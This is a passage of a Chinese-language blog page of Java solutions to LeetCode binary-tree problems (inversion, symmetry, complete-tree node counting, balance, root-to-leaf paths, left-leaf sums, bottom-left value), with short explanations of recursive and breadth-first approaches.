<h3 id="思路：深度优先搜索（递归）"><a href="#思路：深度优先搜索（递归）" class="headerlink" title="思路：深度优先搜索（递归）"></a>思路：深度优先搜索（递归）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> root.left , right = root.right;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> left;</span><br><span class="line">        root.left = right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">        invertTree(left);</span><br><span class="line">        invertTree(right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、对称二叉树"><a href="#四、对称二叉树" class="headerlink" title="四、对称二叉树"></a>四、对称二叉树</h1><h2 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></h2><blockquote>
<p>给你一个二叉树的根节点 <code>root</code> ， 检查它是否轴对称。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/02/19/symtree1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,2,2,3,4,4,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-3"><a href="#思路：递归-3" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>对于二叉树是否对称，要比较的是根节点的左子树与右子树是不是相互翻转的，理解这一点就知道了<strong>其实我们要比较的是两个树（这两个树是根节点的左右子树）</strong>，所以在递归遍历的过程中，也是要同时遍历两棵树。所以比较的是<strong>两个子树的里侧和外侧的元素是否相等</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> compare(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(TreeNode left , TreeNode right)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(left !=<span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(left.val != right.val)   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">compareOutside</span> <span class="operator">=</span> compare(left.left , right.right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">compareInside</span> <span class="operator">=</span> compare(left.right , right.left);</span><br><span class="line">        <span class="keyword">return</span> compareOutside&amp;&amp;compareInside;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="100-相同的树"><a href="#100-相同的树" class="headerlink" title="100. 相同的树"></a><a href="https://leetcode.cn/problems/same-tree/">100. 相同的树</a></h2><blockquote>
<p>给你两棵二叉树的根节点 <code>p</code> 和 <code>q</code> ，编写一个函数来检验这两棵树是否相同。</p>
<p>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p>
<p> <img src="https://assets.leetcode.com/uploads/2020/12/20/ex1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：p = [1,2,3], q = [1,2,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="五、完全二叉树的节点个数"><a href="#五、完全二叉树的节点个数" class="headerlink" title="五、完全二叉树的节点个数"></a>五、完全二叉树的节点个数</h1><h2 id="222-完全二叉树的节点个数"><a href="#222-完全二叉树的节点个数" class="headerlink" title="222. 完全二叉树的节点个数"></a><a href="https://leetcode.cn/problems/count-complete-tree-nodes/">222. 完全二叉树的节点个数</a></h2><blockquote>
<p>给你一棵 完全二叉树 的根节点 root ，求出该树的节点个数。</p>
<p>完全二叉树 的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h 层，则该层包含 1~ 2h 个节点。</p>
<p> <img src="https://assets.leetcode.com/uploads/2021/01/14/complete.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,2,3,4,5,6]</span><br><span class="line">输出：6</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-4"><a href="#思路：递归-4" class="headerlink" title="思路：递归"></a>思路：递归</h3><blockquote>
<p>首先需要明确完全二叉树的定义：<strong>它是一棵空树或者它的叶子节点只出在最后两层，若最后一层不满则叶子节点只在最左侧</strong></p>
<p>再来回顾一下满二叉的节点个数怎么计算，如果满二叉树的层数为h，则总节点数为：2^h - 1.<br>那么我们来对 root 节点的左右子树进行高度统计，分别记为 left 和 right，有以下两种结果：</p>
<p>left &#x3D;&#x3D; right。这说明，左子树一定是满二叉树，因为节点已经填充到右子树了，左子树必定已经填满了。所以左子树的节点总数我们可以直接得到，是 2^left - 1，加上当前这个 root 节点，则正好是 2^left。再对右子树进行递归统计。<br>left !&#x3D; right。说明此时最后一层不满，但倒数第二层已经满了，可以直接得到右子树的节点个数。同理，右子树节点 +root 节点，总数为 2^right。再对左子树进行递归查找。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> countLevel(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> countLevel(root.right);</span><br><span class="line">        <span class="keyword">if</span>(left == right)&#123;</span><br><span class="line">            <span class="keyword">return</span> countNodes(root.right)+(<span class="number">1</span>&lt;&lt;left);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> countNodes(root.left)+(<span class="number">1</span>&lt;&lt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countLevel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">level</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            level++;</span><br><span class="line">            root = root.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="六、平衡二叉树"><a href="#六、平衡二叉树" class="headerlink" title="六、平衡二叉树"></a>六、平衡二叉树</h1><h2 id="110-平衡二叉树"><a href="#110-平衡二叉树" class="headerlink" title="110. 平衡二叉树"></a><a href="https://leetcode.cn/problems/balanced-binary-tree/">110. 平衡二叉树</a></h2><blockquote>
<p>给定一个二叉树，判断它是否是高度平衡的二叉树。</p>
<p>本题中，一棵高度平衡二叉树定义为：</p>
<blockquote>
<p>一个二叉树<em>每个节点</em> 的左右两个子树的高度差的绝对值不超过 1 。</p>
</blockquote>
<p><img src="https://assets.leetcode.com/uploads/2020/10/06/balance_1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,9,20,null,null,15,7]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-5"><a href="#思路：递归-5" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Math.abs(height(root.left)-height(root.right)) &lt;=<span class="number">1</span> &amp;&amp; isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">height</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(height(node.left),height(node.right))+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="七、二叉树的所有路径"><a href="#七、二叉树的所有路径" class="headerlink" title="七、二叉树的所有路径"></a>七、二叉树的所有路径</h1><h2 id="257-二叉树的所有路径"><a href="#257-二叉树的所有路径" class="headerlink" title="257. 二叉树的所有路径"></a><a href="https://leetcode.cn/problems/binary-tree-paths/">257. 二叉树的所有路径</a></h2><blockquote>
<p>给你一个二叉树的根节点 <code>root</code> ，按 <strong>任意顺序</strong> ，返回所有从根节点到叶子节点的路径。</p>
<p><strong>叶子节点</strong> 是指没有子节点的节点。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/03/12/paths-tree.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,2,3,null,5]</span><br><span class="line">输出：[&quot;1-&gt;2-&gt;5&quot;,&quot;1-&gt;3&quot;]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：深度优先搜索（递归）"><a href="#思路1：深度优先搜索（递归）" class="headerlink" title="思路1：深度优先搜索（递归）"></a>思路1：深度优先搜索（递归）</h3><ul>
<li><p>如果当前节点不是叶子节点，则在当前的路径末尾添加该节点，并继续递归遍历该节点的每一个孩子节点。</p>
</li>
<li><p>如果当前节点是叶子节点，则在当前路径末尾添加该节点后我们就得到了一条从根节点到叶子节点的路径，将该路径加入到答案即可。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;String&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        constructPaths(root,<span class="string">&quot;&quot;</span>,paths);</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">constructPaths</span><span class="params">(TreeNode root,String path,List&lt;String&gt;paths)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">pathSB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(path);</span><br><span class="line">            pathSB.append(Integer.toString(root.val));</span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                paths.add(pathSB.toString());</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pathSB.append(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">                constructPaths(root.left,pathSB.toString(),paths);</span><br><span class="line">                constructPaths(root.right,pathSB.toString(),paths);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：O(N^2)</p>
</li>
<li><p>空间复杂度：O(N^2)</p>
</li>
</ul>
<h3 id="思路2：广度优先搜索"><a href="#思路2：广度优先搜索" class="headerlink" title="思路2：广度优先搜索"></a>思路2：广度优先搜索</h3><p>我们也可以用广度优先搜索来实现。我们维护一个队列，存储节点以及根到该节点的路径。一开始这个队列里只有根节点。在每一步迭代中，我们取出队列中的首节点，如果它是叶子节点，则将它对应的路径加入到答案中。如果它不是叶子节点，则将它的所有孩子节点加入到队列的末尾。当队列为空时广度优先搜索结束，我们即能得到答案。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;String&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> paths;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; nodeQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;String&gt; pathQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        nodeQueue.offer(root);</span><br><span class="line">        pathQueue.offer(Integer.toString(root.val));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!nodeQueue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> nodeQueue.poll(); </span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> pathQueue.poll();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                paths.add(path);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    nodeQueue.offer(node.left);</span><br><span class="line">                    pathQueue.offer(<span class="keyword">new</span> <span class="title class_">StringBuffer</span>(path).append(<span class="string">&quot;-&gt;&quot;</span>).append(node.left.val).toString());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    nodeQueue.offer(node.right);</span><br><span class="line">                    pathQueue.offer(<span class="keyword">new</span> <span class="title class_">StringBuffer</span>(path).append(<span class="string">&quot;-&gt;&quot;</span>).append(node.right.val).toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="八、左叶子之和"><a href="#八、左叶子之和" class="headerlink" title="八、左叶子之和"></a>八、左叶子之和</h1><h2 id="404-左叶子之和"><a href="#404-左叶子之和" class="headerlink" title="404. 左叶子之和"></a><a href="https://leetcode.cn/problems/sum-of-left-leaves/">404. 左叶子之和</a></h2><blockquote>
<p>给定二叉树的根节点 <code>root</code> ，返回所有左叶子之和</p>
<p><img src="https://assets.leetcode.com/uploads/2021/04/08/leftsum-tree.jpg"></p>
<p>输入: root &#x3D; [3,9,20,null,null,15,7]<br>输出: 24<br>解释: 在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24</p>
</blockquote>
<h3 id="思路1：深度优先搜索"><a href="#思路1：深度优先搜索" class="headerlink" title="思路1：深度优先搜索"></a>思路1：深度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root != <span class="literal">null</span> ? dfs(root):<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            ans += isLeafNode(node.left) ? node.left.val : dfs(node.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right != <span class="literal">null</span> &amp;&amp; !isLeafNode(node.right))&#123;</span><br><span class="line">            ans += dfs(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isLeafNode</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> node.left ==<span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路2：广度优先搜索-1"><a href="#思路2：广度优先搜索-1" class="headerlink" title="思路2：广度优先搜索"></a>思路2：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(isLeafNode(node.left))&#123;</span><br><span class="line">                    ans += node.left.val;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!isLeafNode(node.right))&#123;</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isLeafNode</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> node.left == <span class="literal">null</span> &amp;&amp; node.right==<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="九、找树左下角的值"><a href="#九、找树左下角的值" class="headerlink" title="九、找树左下角的值"></a>九、找树左下角的值</h1><h2 id="513-找树左下角的值"><a href="#513-找树左下角的值" class="headerlink" title="513. 找树左下角的值"></a><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值</a></h2><blockquote>
<p>给定一个二叉树的 <strong>根节点</strong> <code>root</code>，请找出该二叉树的 <strong>最底层 最左边</strong> 节点的值。</p>
<p>假设二叉树中至少有一个节点。</p>
<p><img src="https://assets.leetcode.com/uploads/2020/12/14/tree1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: root = [2,1,3]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：广度优先搜索-2"><a href="#思路1：广度优先搜索-2" class="headerlink" title="思路1：广度优先搜索"></a>思路1：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                item.add(temp.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(temp.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(temp.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(temp.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(temp.right);</span><br><span class="line">                &#125;</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">List</span> <span class="variable">last</span> <span class="operator">=</span> list.get(list.size()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)last.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span 